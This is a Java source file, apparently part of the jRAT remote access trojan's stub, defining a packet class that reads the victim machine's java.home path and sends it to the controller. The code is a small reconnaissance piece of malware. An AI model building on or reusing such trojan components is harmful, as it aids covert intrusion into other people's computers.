package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;

import java.io.DataOutputStream;


public class Packet15InitJavaPath extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		String path = System.getProperty("java.home");
		sw.writeLine(path);
	}

	@Override
	public byte getPacketId() {
		return (byte) 15;
	}

}
